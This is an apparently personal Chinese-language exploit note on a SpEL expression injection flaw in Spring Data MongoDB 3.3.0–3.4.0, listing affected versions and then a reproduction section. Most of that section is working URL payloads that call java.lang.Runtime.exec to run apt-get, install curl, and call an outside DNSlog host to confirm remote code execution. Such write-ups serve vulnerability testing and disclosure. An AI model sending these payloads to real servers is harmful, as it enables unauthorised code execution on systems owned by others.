# Spring Data MongoDB SpEL表达式注入漏洞

# 一、漏洞描述
Spring官方发布了关于Spring Data MongoDB SpEL表达式注入漏洞的修复信息，当使用@Query或@Aggregation注解进行查询时，若通过SpEL表达式中形如“?0”的占位符来进行参数赋值，同时应用程序未对用户输入进行过滤处理，则可能受到SpEL表达式注入的影响，成功利用该漏洞的攻击者可在目标服务器上执行代码。

# 二、影响版本
Spring Data MongoDB == 3.4.0

3.3.0 <= Spring Data MongoDB <= 3.3.4

旧的、不受支持的版本也会受到影响

# 三、资产测绘
```plain

```

![1730011780302-72a7fb38-c2c2-4f89-bf47-cdd8f776e224.png](./img/ZExlZ6n1pcklAxos/1730011780302-72a7fb38-c2c2-4f89-bf47-cdd8f776e224-536417.png)

# 三、漏洞复现
```plain
#更新
/name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get update')

#下载curl
/name=T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('apt-get install -y curl')
```

执行curl dnslog

```plain
/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27curl%20hrnceuwsrl.iyhc.eu.org%27)
```

![1730012025414-b5771bdf-4af2-42ab-873f-54933df0e54b.png](./img/ZExlZ6n1pcklAxos/1730012025414-b5771bdf-4af2-42ab-873f-54933df0e54b-779912.png)





> 更新: 2024-11-27 10:04:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dcbhf1pnmuar814k>